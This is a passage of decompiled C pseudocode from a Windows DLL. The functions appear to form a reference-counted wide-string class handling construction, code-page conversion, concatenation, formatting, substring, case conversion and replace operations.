  if ( !*(_BYTE *)(a1 + 8) )
    return a1 + 11;
  v3 = *(unsigned __int16 *)(a1 + 9);
  v4 = a1 + 11;
  sub_1000CBBE(v4, v3);
  result = v4;
  *(_BYTE *)(a1 + 8) = 0;
  return result;
}

//----- (1000CC40) --------------------------------------------------------
int __cdecl sub_1000CC40(int a1)
{
  if ( *(_WORD *)(a1 + 16) )
  {
    sub_1000CBBE(a1 + 20, *(unsigned __int16 *)(a1 + 18));
    *(_WORD *)(a1 + 16) = 0;
  }
  return a1 + 20;
}

//----- (1000CC86) --------------------------------------------------------
errno_t __userpurge sub_1000CC86@<eax>(int a1@<esi>, wchar_t *String)
{
  size_t v2; // eax
  wchar_t *v3; // eax
  errno_t result; // eax
  int v5; // eax
  rsize_t v6; // [esp-10h] [ebp-20h]

  *(_DWORD *)(a1 + 16) = 0;
  *(_BYTE *)(a1 + 24) = 0;
  *(_DWORD *)(a1 + 20) = 0;
  v2 = wcslen(String);
  *(_DWORD *)(a1 + 28) = v2;
  *(_DWORD *)(a1 + 32) = v2;
  v3 = (wchar_t *)operator new(2 * (v2 + 1));
  v6 = *(_DWORD *)(a1 + 28) + 1;
  *(_DWORD *)(a1 + 12) = v3;
  result = wcscpy_s(v3, v6, String);
  if ( result )
  {
    v5 = sub_1000E7F7(1, 0);
    sub_10007882(v5);
  }
  return result;
}
// 1000E7F7: using guessed type _DWORD __stdcall sub_1000E7F7(char, _DWORD);

//----- (1000CCFC) --------------------------------------------------------
_DWORD *__cdecl sub_1000CCFC(_DWORD *a1)
{
  _DWORD *v1; // ecx
  _DWORD *v2; // ebx
  unsigned int v3; // esi
  _DWORD *v4; // eax
  _DWORD *v5; // eax
  int v7[5]; // [esp+Ch] [ebp-24h] BYREF
  int v8; // [esp+20h] [ebp-10h]
  int v9; // [esp+2Ch] [ebp-4h]

  v2 = v1;
  v8 = 0;
  v3 = v1[3];
  if ( v3 < 2 )
    goto LABEL_8;
  if ( sub_1000B746(v1, 0) != -257 )
  {
    if ( v3 >= 4 && sub_1000B6F2(v2, 0) == 0xFFFF )
    {
      v5 = (_DWORD *)sub_1000B67C(v2, (int)v7, 4, v3 - 4);
      v9 = 2;
      sub_1000D230(v5, a1);
      v8 = 1;
      goto LABEL_4;
    }
LABEL_8:
    sub_1000D2FA(a1, 0);
    v9 = 0;
    v8 = 1;
    return a1;
  }
  v4 = (_DWORD *)sub_1000B67C(v2, (int)v7, 2, v3 - 2);
  v9 = 1;
  sub_1000D230(v4, a1);
  v8 = 1;
LABEL_4:
  LOBYTE(v9) = 0;
  sub_1000B3DF(v7);
  return a1;
}
// 1000CD11: variable 'v1' is possibly undefined
// 1000CCFC: using guessed type int var_24[5];

//----- (1000CDC9) --------------------------------------------------------
_DWORD *__userpurge sub_1000CDC9@<eax>(int a1@<edi>, _DWORD *a2)
{
  size_t v2; // eax
  int v3; // ecx
  const void *v4; // ebx
  int v5; // ecx
  int v6; // eax
  size_t v8; // [esp-4h] [ebp-1Ch]

  v2 = sub_1000D687(a1);
  sub_1000B1F3((void *)(2 * v2 + 2), (int)a2, 0);
  sub_1000B768(v3, a2, 0, 65279);
  v4 = *(const void **)(*(_DWORD *)(a1 + 4) + 12);
  v8 = 2 * sub_1000D687(a1);
  v6 = sub_1000B49B(a2, v5);
  memcpy((void *)(v6 + 2), v4, v8);
  *(_BYTE *)(a2[1] + 8) = 1;
  return a2;
}
// 1000CE05: variable 'v3' is possibly undefined
// 1000CE1D: variable 'v5' is possibly undefined

//----- (1000CE46) --------------------------------------------------------
void *__thiscall sub_1000CE46(void *this, void *a2)
{
  void *v3; // eax
  void *v5; // [esp-4h] [ebp-1Ch]

  v5 = (void *)sub_1000D3DA((int)this);
  v3 = (void *)sub_1000D687((int)this);
  sub_1000B1F3(v3, (int)a2, v5);
  return a2;
}

//----- (1000CE8E) --------------------------------------------------------
errno_t __thiscall sub_1000CE8E(int this, wchar_t *String, wchar_t *Source)
{
  size_t v4; // edi
  size_t v5; // eax
  wchar_t *v6; // eax
  int v7; // eax
  errno_t result; // eax
  rsize_t v9; // [esp-14h] [ebp-2Ch]

  *(_DWORD *)(this + 16) = 0;
  *(_BYTE *)(this + 24) = 0;
  *(_DWORD *)(this + 20) = 0;
  v4 = wcslen(String);
  v5 = v4 + wcslen(Source);
  *(_DWORD *)(this + 28) = v5;
  *(_DWORD *)(this + 32) = v5;
  v6 = (wchar_t *)operator new(2 * (v5 + 1));
  v9 = *(_DWORD *)(this + 28) + 1;
  *(_DWORD *)(this + 12) = v6;
  if ( wcscpy_s(v6, v9, String)
    || (result = wcscat_s(*(wchar_t **)(this + 12), *(_DWORD *)(this + 28) + 1, Source)) != 0 )
  {
    v7 = sub_1000E7F7(1, 0);
    sub_10007882(v7);
  }
  return result;
}
// 1000E7F7: using guessed type _DWORD __stdcall sub_1000E7F7(char, _DWORD);

//----- (1000CF41) --------------------------------------------------------
int __usercall sub_1000CF41@<eax>(unsigned int a1@<eax>, int a2@<esi>)
{
  char *v3; // edx
  char v4; // cf
  char *v5; // edi
  int i; // ecx

  *(_DWORD *)(a2 + 4) = 0;
  *(_BYTE *)(a2 + 8) = 1;
  *(_DWORD *)a2 = &off_10102390;
  v3 = (char *)operator new(2 * (a1 + 1));
  *(_DWORD *)(a2 + 12) = v3;
  *(_DWORD *)(a2 + 16) = 0;
  *(_DWORD *)(a2 + 20) = 0;
  *(_BYTE *)(a2 + 24) = 0;
  *(_DWORD *)(a2 + 28) = a1;
  *(_DWORD *)(a2 + 32) = a1;
  if ( a1 )
  {
    v4 = a1 & 1;
    memset32(v3, 2097184, a1 >> 1);
    v5 = &v3[4 * (a1 >> 1)];
    for ( i = v4; i; --i )
    {
      *(_WORD *)v5 = 32;
      v5 += 2;
    }
  }
  *(_WORD *)(*(_DWORD *)(a2 + 12) + 2 * *(_DWORD *)(a2 + 28)) = 0;
  return a2;
}
// 10102390: using guessed type int (__thiscall *off_10102390)(void *Block, char);

//----- (1000CFA5) --------------------------------------------------------
void **__thiscall sub_1000CFA5(void **Block, char a2)
{
  sub_1000D12C(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000CFC4) --------------------------------------------------------
int __userpurge sub_1000CFC4@<eax>(int a1@<eax>, wchar_t *String)
{
  *(_DWORD *)(a1 + 4) = 0;
  *(_BYTE *)(a1 + 8) = 1;
  *(_DWORD *)a1 = &off_10102390;
  sub_1000CC86(a1, String);
  return a1;
}
// 10102390: using guessed type int (__thiscall *off_10102390)(void *Block, char);

//----- (1000CFE7) --------------------------------------------------------
int __userpurge sub_1000CFE7@<eax>(int a1@<esi>, char *String, UINT CodePage, size_t MaxCount)
{
  size_t v4; // eax
  WCHAR *v5; // eax
  int v6; // ecx
  _DWORD *v7; // eax
  _DWORD v9[6]; // [esp+4h] [ebp-18h] BYREF

  *(_DWORD *)(a1 + 4) = 0;
  *(_BYTE *)(a1 + 8) = 1;
  *(_DWORD *)a1 = &off_10102390;
  *(_DWORD *)(a1 + 16) = 0;
  *(_DWORD *)(a1 + 20) = 0;
  *(_BYTE *)(a1 + 24) = 0;
  v4 = strnlen(String, MaxCount);
  *(_DWORD *)(a1 + 28) = v4;
  *(_DWORD *)(a1 + 32) = v4;
  v5 = (WCHAR *)operator new(2 * (v4 + 1));
  v6 = *(_DWORD *)(a1 + 28);
  *(_DWORD *)(a1 + 12) = v5;
  if ( v6 && !MultiByteToWideChar(CodePage, 0, String, v6, v5, v6 + 1) )
  {
    v7 = sub_1000E9DF(v9, 1, 1);
    v9[5] = 0;
    sub_1000A947(v7, 124);
  }
  *(_WORD *)(*(_DWORD *)(a1 + 12) + 2 * *(_DWORD *)(a1 + 28)) = 0;
  return a1;
}
// 10102390: using guessed type int (__thiscall *off_10102390)(void *Block, char);

//----- (1000D089) --------------------------------------------------------
void *__usercall sub_1000D089@<eax>(int a1@<esi>)
{
  void *result; // eax
  int v2; // eax
  _DWORD *v3; // eax
  _DWORD v4[6]; // [esp+4h] [ebp-18h] BYREF

  result = &loc_100A9F2A;
  if ( !*(_BYTE *)(a1 + 24) || !*(_BYTE *)(a1 + 8) )
  {
    if ( *(_DWORD *)(a1 + 16) && *(_DWORD *)(a1 + 28) != *(_DWORD *)(a1 + 20) )
    {
      j__free(*(void **)(a1 + 16));
      *(_DWORD *)(a1 + 16) = operator new(*(_DWORD *)(a1 + 28) + 1);
      *(_DWORD *)(a1 + 20) = *(_DWORD *)(a1 + 28);
    }
    if ( !*(_DWORD *)(a1 + 16) )
    {
      v2 = *(_DWORD *)(a1 + 28);
      *(_DWORD *)(a1 + 20) = v2;
      *(_DWORD *)(a1 + 16) = operator new(v2 + 1);
    }
    result = (void *)WideCharToMultiByte(
                       0,
                       0,
                       *(LPCWCH *)(a1 + 12),
                       *(_DWORD *)(a1 + 28) + 1,
                       *(LPSTR *)(a1 + 16),
                       *(_DWORD *)(a1 + 20) + 1,
                       0,
                       0);
    if ( !result )
    {
      v3 = sub_1000E9DF(v4, 1, 1);
      v4[5] = 0;
      sub_1000A947(v3, 156);
    }
    *(_BYTE *)(a1 + 24) = 1;
  }
  return result;
}

//----- (1000D12C) --------------------------------------------------------
void __thiscall sub_1000D12C(void **this)
{
  void *v2; // esi
  _DWORD v3[7]; // [esp+0h] [ebp-1Ch] BYREF

  v3[3] = v3;
  *this = &off_10102390;
  v3[6] = 0;
  j__free(this[3]);
  v2 = this[4];
  if ( v2 )
    j__free(v2);
}
// 10102390: using guessed type int (__thiscall *off_10102390)(void *Block, char);

//----- (1000D17D) --------------------------------------------------------
_DWORD *__stdcall sub_1000D17D(_DWORD *a1, wchar_t *String)
{
  void *v2; // eax
  int v3; // eax

  *a1 = off_1010238C;
  v2 = operator new(0x24u);
  if ( v2 )
    v3 = sub_1000CFC4((int)v2, String);
  else
    v3 = 0;
  a1[1] = v3;
  sub_100012A0(a1 + 1);
  return a1;
}
// 1010238C: using guessed type int (__thiscall *off_1010238C[2])(void *, char);

//----- (1000D1D6) --------------------------------------------------------
_DWORD *__stdcall sub_1000D1D6(_DWORD *a1, unsigned int a2)
{
  void *v2; // esi
  int v3; // eax

  *a1 = off_1010238C;
  v2 = operator new(0x24u);
  v3 = 0;
  if ( v2 )
    v3 = sub_1000CF41(a2, (int)v2);
  a1[1] = v3;
  sub_100012A0(a1 + 1);
  return a1;
}
// 1010238C: using guessed type int (__thiscall *off_1010238C[2])(void *, char);

//----- (1000D230) --------------------------------------------------------
_DWORD *__userpurge sub_1000D230@<eax>(_DWORD *a1@<ebx>, _DWORD *a2)
{
  void *v2; // esi
  int v3; // eax
  const wchar_t *v4; // eax
  unsigned int v5; // eax
  _DWORD *v6; // edi
  unsigned int v7; // eax
  _DWORD *v8; // eax
  int v9; // esi
  const void *v10; // eax
  int v11; // edx
  size_t v13; // [esp-4h] [ebp-1Ch]
  void *Block; // [esp+8h] [ebp-10h] BYREF
  int v15; // [esp+14h] [ebp-4h]

  *a2 = off_1010238C;
  v2 = operator new(0x24u);
  Block = v2;
  v3 = 0;
  v15 = 0;
  if ( v2 )
  {
    v13 = a1[3] >> 1;
    v4 = (const wchar_t *)sub_1000B4B8(a1);
    v5 = wcsnlen(v4, v13);
    v3 = sub_1000CF41(v5, (int)v2);
  }
  v6 = a2 + 1;
  a2[1] = v3;
  sub_100012A0(a2 + 1);
  v15 = 1;
  v7 = a1[3];
  if ( (v7 & 1) != 0 && v7 >> 1 <= *(_DWORD *)(*v6 + 28) )
  {
    v8 = sub_1000E7F7(&Block, 1, 0);
    LOBYTE(v15) = 2;
    sub_10007882((int)v8);
  }
  v9 = *(_DWORD *)(*v6 + 28);
  v10 = (const void *)sub_1000B4B8(a1);
  memcpy_s(*(void *const *)(v11 + 12), 2 * v9, v10, 2 * v9);
  *(_WORD *)(*(_DWORD *)(*v6 + 12) + 2 * *(_DWORD *)(*v6 + 28)) = 0;
  return a2;
}
// 1000D2C0: variable 'v11' is possibly undefined
// 1010238C: using guessed type int (__thiscall *off_1010238C[2])(void *, char);

//----- (1000D2FA) --------------------------------------------------------
_DWORD *__cdecl sub_1000D2FA(_DWORD *a1, UINT CodePage)
{
  _DWORD *v2; // ecx
  _DWORD *v3; // esi
  char *v4; // eax
  int v5; // eax
  size_t v7; // [esp-4h] [ebp-24h]
  void *Block; // [esp+10h] [ebp-10h]

  v3 = v2;
  *a1 = off_1010238C;
  Block = operator new(0x24u);
  if ( Block )
  {
    v7 = v3[3];
    v4 = (char *)sub_1000B4B8(v3);
    v5 = sub_1000CFE7((int)Block, v4, CodePage, v7);
  }
  else
  {
    v5 = 0;
  }
  a1[1] = v5;
  sub_100012A0(a1 + 1);
  return a1;
}
// 1000D312: variable 'v2' is possibly undefined
// 1010238C: using guessed type int (__thiscall *off_1010238C[2])(void *, char);

//----- (1000D372) --------------------------------------------------------
_DWORD *__stdcall sub_1000D372(_DWORD *a1, int a2)
{
  *a1 = off_1010238C;
  a1[1] = *(_DWORD *)(a2 + 4);
  sub_100012A0(a1 + 1);
  return a1;
}
// 1010238C: using guessed type int (__thiscall *off_1010238C[2])(void *, char);

//----- (1000D3AD) --------------------------------------------------------
void __thiscall sub_1000D3AD(int *this)
{
  *this = (int)off_1010238C;
  sub_10012C9D(this + 1);
}
// 1010238C: using guessed type int (__thiscall *off_1010238C[2])(void *, char);

//----- (1000D3DA) --------------------------------------------------------
int __usercall sub_1000D3DA@<eax>(int a1@<edi>)
{
  sub_1000D089(*(_DWORD *)(a1 + 4));
  return *(_DWORD *)(*(_DWORD *)(a1 + 4) + 16);
}

//----- (1000D3EB) --------------------------------------------------------
_DWORD *__cdecl sub_1000D3EB(_DWORD *a1, char *String)
{
  void *v2; // eax
  int v3; // eax

  *a1 = off_1010238C;
  v2 = operator new(0x24u);
  if ( v2 )
    v3 = sub_1000CFE7((int)v2, String, 0, 0x7FFFFFFFu);
  else
    v3 = 0;
  a1[1] = v3;
  sub_100012A0(a1 + 1);
  return a1;
}
// 1010238C: using guessed type int (__thiscall *off_1010238C[2])(void *, char);

//----- (1000D45C) --------------------------------------------------------
__int16 __fastcall sub_1000D45C(unsigned int a1, int a2, int a3)
{
  int v3; // eax
  _DWORD *v4; // eax

  v3 = *(_DWORD *)(a3 + 4);
  if ( a1 >= *(_DWORD *)(v3 + 28) )
  {
    v4 = sub_1000E7F7(&a3, 1, 0);
    sub_10007882((int)v4);
  }
  return *(_WORD *)(*(_DWORD *)(v3 + 12) + 2 * a1);
}

//----- (1000D4A1) --------------------------------------------------------
char __thiscall sub_1000D4A1(LONG *this)
{
  LONG *v1; // esi
  LONG v2; // eax
  char v3; // bl
  void *v4; // eax
  void *v6; // [esp+8h] [ebp-10h] BYREF
  int v7; // [esp+14h] [ebp-4h]

  v1 = this + 1;
  v2 = this[1];
  v3 = *(_BYTE *)(v2 + 8);
  if ( *(_DWORD *)(v2 + 4) > 1u )
  {
    v6 = operator new(0x24u);
    v4 = 0;
    v7 = 0;
    if ( v6 )
      v4 = (void *)sub_1000CFC4((int)v6, *(wchar_t **)(*v1 + 12));
    v7 = -1;
    v6 = v4;
    sub_100012A0((LONG *)&v6);
    v7 = 1;
    sub_10001236((LONG *)&v6, v1);
    v7 = -1;
    sub_10012C9D((int *)&v6);
  }
  *(_BYTE *)(*v1 + 8) = 0;
  *(_BYTE *)(*v1 + 24) = 0;
  return v3;
}

//----- (1000D52B) --------------------------------------------------------
int __usercall sub_1000D52B@<eax>(int a1@<ecx>, unsigned int a2@<edi>, LONG *a3@<esi>)
{
  _DWORD *v3; // eax
  _DWORD v5[4]; // [esp+0h] [ebp-10h] BYREF

  v5[0] = a1;
  if ( a2 >= *(_DWORD *)(a3[1] + 28) )
  {
    v3 = sub_1000E7F7(v5, 1, 0);
    v5[3] = 0;
    sub_10007882((int)v3);
  }
  sub_1000D4A1(a3);
  return *(_DWORD *)(a3[1] + 12) + 2 * a2;
}

//----- (1000D575) --------------------------------------------------------
int __userpurge sub_1000D575@<eax>(int a1@<ebx>, _DWORD *a2)
{
  _DWORD *v2; // esi
  wchar_t *v3; // eax
  wchar_t *v4; // ecx

  v2 = operator new(0x24u);
  if ( v2 )
  {
    v3 = *(wchar_t **)(a2[1] + 12);
    v4 = *(wchar_t **)(*(_DWORD *)(a1 + 4) + 12);
    v2[1] = 0;
    *((_BYTE *)v2 + 8) = 1;
    *v2 = &off_10102390;
    sub_1000CE8E((int)v2, v4, v3);
  }
  else
  {
    v2 = 0;
  }
  a2 = v2;
  sub_100012A0((LONG *)&a2);
  sub_10001236((LONG *)&a2, (LONG *)(a1 + 4));
  sub_10012C9D((int *)&a2);
  return a1;
}
// 10102390: using guessed type int (__thiscall *off_10102390)(void *Block, char);

//----- (1000D5FF) --------------------------------------------------------
_DWORD *__cdecl sub_1000D5FF(_DWORD *a1, int a2, _DWORD *a3)
{
  sub_1000D372(a1, a2);
  sub_1000D575((int)a1, a3);
  return a1;
}

//----- (1000D641) --------------------------------------------------------
BOOL __usercall sub_1000D641@<eax>(int a1@<eax>, int a2@<ecx>)
{
  return sub_1000D65C(a1, a2) != 0;
}

//----- (1000D64D) --------------------------------------------------------
bool __usercall sub_1000D64D@<al>(int a1@<eax>, int a2@<ecx>)
{
  return sub_1000D65C(a1, a2) < 0;
}

//----- (1000D65C) --------------------------------------------------------
int __usercall sub_1000D65C@<eax>(int a1@<eax>, int a2@<ecx>)
{
  int v2; // eax
  const wchar_t *v3; // edx

  v2 = *(_DWORD *)(a1 + 4);
  v3 = *(const wchar_t **)(*(_DWORD *)(a2 + 4) + 12);
  if ( v3 == *(const wchar_t **)(v2 + 12) )
    return 0;
  else
    return wcscmp(v3, *(const wchar_t **)(v2 + 12));
}

//----- (1000D679) --------------------------------------------------------
int __usercall sub_1000D679@<eax>(LONG *a1@<esi>)
{
  sub_1000D4A1(a1);
  return *(_DWORD *)(a1[1] + 12);
}

//----- (1000D687) --------------------------------------------------------
size_t __usercall sub_1000D687@<eax>(int a1@<eax>)
{
  int v1; // ecx

  v1 = *(_DWORD *)(a1 + 4);
  if ( *(_BYTE *)(v1 + 8) )
    return *(_DWORD *)(v1 + 32);
  else
    return sub_1000D699(a1);
}

//----- (1000D699) --------------------------------------------------------
size_t __usercall sub_1000D699@<eax>(int a1@<eax>)
{
  return wcsnlen(*(const wchar_t **)(*(_DWORD *)(a1 + 4) + 12), *(_DWORD *)(*(_DWORD *)(a1 + 4) + 28) + 1);
}

//----- (1000D6AC) --------------------------------------------------------
int __usercall sub_1000D6AC@<eax>(int a1@<esi>)
{
  int v1; // edi
  int result; // eax

  v1 = *(_DWORD *)(a1 + 4);
  *(_DWORD *)(v1 + 32) = sub_1000D699(a1);
  result = *(_DWORD *)(a1 + 4);
  *(_BYTE *)(result + 8) = 1;
  return result;
}

//----- (1000D6C3) --------------------------------------------------------
int __usercall sub_1000D6C3@<eax>(int a1@<esi>, wchar_t *Format, ...)
{
  _DWORD *v2; // eax
  _DWORD *v3; // eax
  wchar_t Buffer[1002]; // [esp+4h] [ebp-7E8h] BYREF
  int v6; // [esp+7D8h] [ebp-14h] BYREF
  int v7; // [esp+7DCh] [ebp-10h] BYREF
  int v8; // [esp+7E8h] [ebp-4h]
  va_list va; // [esp+7F8h] [ebp+Ch] BYREF

  va_start(va, Format);
  if ( _vsnwprintf_s(Buffer, 0x3E8u, 0xFFFFFFFF, Format, va) == -1 )
  {
    v2 = sub_1000E7F7(&v7, 1, 0);
    v8 = 0;
    sub_10007882((int)v2);
  }
  v3 = sub_1000D17D(&v6, Buffer);
  v8 = 1;
  sub_10001236(v3 + 1, (LONG *)(a1 + 4));
  v8 = -1;
  sub_1000D3AD(&v6);
  return a1;
}

//----- (1000D74C) --------------------------------------------------------
_DWORD *__cdecl sub_1000D74C(_DWORD *a1, int ArgList)
{
  _DWORD *v2; // eax
  int v3; // eax
  int v5[2]; // [esp+Ch] [ebp-1Ch] BYREF
  int v6; // [esp+14h] [ebp-14h]
  int v7; // [esp+24h] [ebp-4h]

  v6 = 0;
  v2 = sub_1000D17D(v5, &word_1017A380);
  v7 = 1;
  v3 = sub_1000D6C3((int)v2, a08x, ArgList);
  sub_1000D372(a1, v3);
  v6 = 1;
  LOBYTE(v7) = 0;
  sub_1000D3AD(v5);
  return a1;
}

//----- (1000D7AD) --------------------------------------------------------
_DWORD *__cdecl sub_1000D7AD(_DWORD *a1, int ArgList)
{
  _DWORD *v2; // eax
  int v3; // eax
  int v5[2]; // [esp+Ch] [ebp-1Ch] BYREF
  int v6; // [esp+14h] [ebp-14h]
  int v7; // [esp+24h] [ebp-4h]

  v6 = 0;
  v2 = sub_1000D17D(v5, &word_1017A39C);
  v7 = 1;
  v3 = sub_1000D6C3((int)v2, aU, ArgList);
  sub_1000D372(a1, v3);
  v6 = 1;
  LOBYTE(v7) = 0;
  sub_1000D3AD(v5);
  return a1;
}

//----- (1000D80E) --------------------------------------------------------
unsigned int __usercall sub_1000D80E@<eax>(int a1@<eax>)
{
  return wcstoul(*(const wchar_t **)(*(_DWORD *)(a1 + 4) + 12), 0, 16);
}

//----- (1000D822) --------------------------------------------------------
unsigned int __usercall sub_1000D822@<eax>(int a1@<eax>)
{
  return wcstoul(*(const wchar_t **)(*(_DWORD *)(a1 + 4) + 12), 0, 10);
}

//----- (1000D836) --------------------------------------------------------
_DWORD *__fastcall sub_1000D836(int a1, int a2, _DWORD *a3, unsigned int a4)
{
  unsigned int v4; // ebx
  _DWORD *v6; // eax
  int v7; // eax
  int v8; // edi
  rsize_t v9; // esi
  int v11; // [esp+Ch] [ebp-1Ch] BYREF
  int v12; // [esp+10h] [ebp-18h]
  int v13; // [esp+14h] [ebp-14h]
  int v14; // [esp+24h] [ebp-4h]

  v4 = a1;
  v13 = 0;
  if ( a1 < 0 && a1 != -2 )
  {
    v6 = sub_1000E7F7(&a4, 1, 0);
    v14 = 1;
    goto LABEL_4;
  }
  v7 = *(_DWORD *)(a2 + 4);
  if ( a4 < *(_DWORD *)(v7 + 28) && a1 )
  {
    if ( a1 == -2 || a4 + a1 > *(_DWORD *)(v7 + 28) )
      v4 = *(_DWORD *)(v7 + 28) - a4;
    sub_1000D1D6(&v11, v4);
    v14 = 2;
    v8 = *(_DWORD *)(*(_DWORD *)(a2 + 4) + 12);
    v9 = *(_DWORD *)(v12 + 28) + 1;
    sub_1000D4A1(&v11);
    if ( wcsncpy_s(*(wchar_t **)(v12 + 12), v9, (const wchar_t *)(v8 + 2 * a4), v4) )
    {
      v6 = sub_1000E7F7(&a4, 1, 0);
      LOBYTE(v14) = 3;
LABEL_4:
      sub_10007882((int)v6);
    }
    sub_1000D372(a3, (int)&v11);
    v13 = 1;
    LOBYTE(v14) = 0;
    sub_1000D3AD(&v11);
  }
  else
  {
    sub_1000D17D(a3, &word_1017A3E0);
    v14 = 0;
    v13 = 1;
  }
  return a3;
}

//----- (1000D948) --------------------------------------------------------
LONG *__usercall sub_1000D948@<eax>(LONG *a1@<eax>)
{
  size_t v2; // edi
  char v3; // bl
  wchar_t *v4; // eax
  size_t v6; // [esp-Ch] [ebp-18h]

  v2 = *(_DWORD *)(a1[1] + 28);
  v3 = sub_1000D4A1(a1);
  v6 = *(_DWORD *)(a1[1] + 28) + 1;
  v4 = (wchar_t *)sub_1000D679(a1);
  _wcsnset_s(v4, v6, 0, v2);
  if ( v3 )
    sub_1000D6AC((int)a1);
  return a1;
}

//----- (1000D984) --------------------------------------------------------
LONG *__usercall sub_1000D984@<eax>(LONG *a1@<eax>)
{
  char v2; // bl
  wchar_t *v3; // eax
  size_t v5; // [esp-4h] [ebp-Ch]

  v2 = sub_1000D4A1(a1);
  v5 = *(_DWORD *)(a1[1] + 28) + 1;
  v3 = (wchar_t *)sub_1000D679(a1);
  _wcsupr_s(v3, v5);
  if ( v2 )
    sub_1000D6AC((int)a1);
  return a1;
}

//----- (1000D9B4) --------------------------------------------------------
LONG *__usercall sub_1000D9B4@<eax>(LONG *a1@<eax>)
{
  char v2; // bl
  wchar_t *v3; // eax
  size_t v5; // [esp-4h] [ebp-Ch]

  v2 = sub_1000D4A1(a1);
  v5 = *(_DWORD *)(a1[1] + 28) + 1;
  v3 = (wchar_t *)sub_1000D679(a1);
  _wcslwr_s(v3, v5);
  if ( v2 )
    sub_1000D6AC((int)a1);
  return a1;
}

//----- (1000D9E4) --------------------------------------------------------
LONG *__userpurge sub_1000D9E4@<eax>(int a1@<eax>, _DWORD *a2@<ecx>, LONG *a3, unsigned int a4)
{
  if ( *(_DWORD *)(a2[1] + 28) == *(_DWORD *)(*(_DWORD *)(a1 + 4) + 28) )
    return sub_1000DD58(a3, a1, (int)a2, a4);
  else
    return (LONG *)sub_1000DA16(a2, (int)a3, a1, a4);
}

//----- (1000DA16) --------------------------------------------------------
int __thiscall sub_1000DA16(_DWORD *this, int a2, int a3, unsigned int a4)
{
  int v5; // eax
  _DWORD *v6; // eax
  int i; // eax
  unsigned int v9; // edi
  LONG *v10; // esi
  int v11; // eax
  int v12; // ecx
  int v13; // eax
  unsigned int v14; // edi
  int v15; // esi
  char *v16; // esi
  int v17; // eax
  int v18; // eax
  _DWORD *v19; // eax
  int v20; // ebx
  int v21; // esi
  unsigned int v22; // [esp+10h] [ebp-48h]
  char *v23; // [esp+10h] [ebp-48h]
  char *v24; // [esp+10h] [ebp-48h]
  int v25; // [esp+14h] [ebp-44h] BYREF
  unsigned int v26; // [esp+18h] [ebp-40h]
  void *Source; // [esp+1Ch] [ebp-3Ch]
  LONG *v28; // [esp+20h] [ebp-38h] BYREF
  int v29; // [esp+24h] [ebp-34h] BYREF
  int v30; // [esp+28h] [ebp-30h] BYREF
  LONG v31; // [esp+2Ch] [ebp-2Ch] BYREF
  void *v32[2]; // [esp+30h] [ebp-28h] BYREF
  int (__thiscall **v33)(void *, char); // [esp+38h] [ebp-20h] BYREF
  int v34; // [esp+3Ch] [ebp-1Ch]
  int v35; // [esp+40h] [ebp-18h]
  void *v36; // [esp+44h] [ebp-14h]
  int v37; // [esp+54h] [ebp-4h]

  v5 = this[1];
  if ( !*(_DWORD *)(v5 + 28) )
  {
    v6 = sub_1000E7F7(&v28, 1, 0);
    v37 = 0;
    sub_10007882((int)v6);
  }
  if ( *(_DWORD *)(v5 + 28) > *(_DWORD *)(*(_DWORD *)(a2 + 4) + 28) )
    return a2;
  v34 = 0;
  v33 = &off_10102398;
  v35 = 16;
  v36 = operator new(0x40u);
  v37 = 3;
  v22 = 0;
  for ( i = sub_1000DF11(0, a2, (int)this); ; i = sub_1000DF11(v25 + 1, a2, (int)this) )
  {
    v25 = i;
    if ( i == -1 || a4 && a4 <= v22 )
      break;
    ++v22;
    sub_10015925((int *)&v33, (int)&v25);
  }
  if ( v34 )
  {
    sub_1000D1D6(
      &v30,
      *(_DWORD *)(*(_DWORD *)(a2 + 4) + 28) + v34 * (*(_DWORD *)(*(_DWORD *)(a3 + 4) + 28) - *(_DWORD *)(this[1] + 28)));
    LOBYTE(v37) = 4;
    sub_1000D948(&v30);
    sub_10056FB7(&v33, (int)v32);
    LOBYTE(v37) = 5;
    v26 = -1;
    v9 = 0;
    v23 = 0;
    do
    {
      v10 = *(LONG **)(*(int (__thiscall **)(void *))(*(_DWORD *)v32[0] + 12))(v32[0]);
      v28 = v10;
      if ( v26 != -1 )
        v10 = (LONG *)((char *)v10 - *(_DWORD *)(this[1] + 28) - v26);
      v11 = *(_DWORD *)(v31 + 28);
      if ( v11 + 1 <= v9 )
        v26 = 0;
      else
        v26 = v11 - v9 + 1;
      Source = *(void **)(*(_DWORD *)(a2 + 4) + 12);
      sub_1000D4A1(&v30);
      memcpy_s(
        (void *const)(*(_DWORD *)(v31 + 12) + 2 * v9),
        2 * v26,
        (char *)Source + 2 * (_DWORD)v23,
        2 * (_DWORD)v10);
      v12 = *(_DWORD *)(v31 + 28);
      v24 = &v23[(_DWORD)v10];
      v13 = *(_DWORD *)(a3 + 4);
      v14 = (unsigned int)v10 + v9;
      v15 = *(_DWORD *)(v13 + 28);
      if ( v12 + 1 <= v14 )
        v26 = 0;
      else
        v26 = v12 - v14 + 1;
      Source = *(void **)(v13 + 12);
      sub_1000D4A1(&v30);
      memcpy_s((void *const)(*(_DWORD *)(v31 + 12) + 2 * v14), 2 * v26, Source, 2 * v15);
      v9 = v15 + v14;
      v16 = &v24[*(_DWORD *)(this[1] + 28)];
      v26 = (unsigned int)v28;
      v17 = *(_DWORD *)v32[0];
      v23 = v16;
      v28 = (LONG *)v32[0];
      if ( (*(unsigned __int8 (**)(void))(v17 + 4))() )
      {
        v19 = sub_1000E8EF(&v29);
        LOBYTE(v37) = 6;
        sub_100078FE((int)v19);
      }
      (*(void (__thiscall **)(LONG *))(*v28 + 16))(v28);
    }
    while ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v32[0] + 4))(v32[0]) );
    v28 = (LONG *)(a2 + 4);
    v18 = *(_DWORD *)(a2 + 4);
    if ( *(_DWORD *)(v18 + 28) <= (unsigned int)v16 )
      v26 = 0;
    else
      v26 = *(_DWORD *)(v18 + 28) - (_DWORD)v16;
    v20 = *(_DWORD *)(v18 + 12);
    v21 = *(_DWORD *)(v31 + 28) + 1;
    sub_1000D4A1(&v30);
    memcpy_s(
      (void *const)(*(_DWORD *)(v31 + 12) + 2 * v9),
      2 * (v21 - v9),
      (const void *const)(v20 + 2 * (_DWORD)v23),
      2 * v26);
    sub_1000D6AC((int)&v30);
    sub_10001236(&v31, v28);
    LOBYTE(v37) = 4;
    sub_1002228F(v32);
    LOBYTE(v37) = 3;
    sub_1000D3AD(&v30);
    v37 = -1;
    sub_1000E4EA((int)&v33);
    return a2;
  }
  else
  {
    v37 = -1;
    sub_1000E4EA((int)&v33);
    return a2;
  }
}
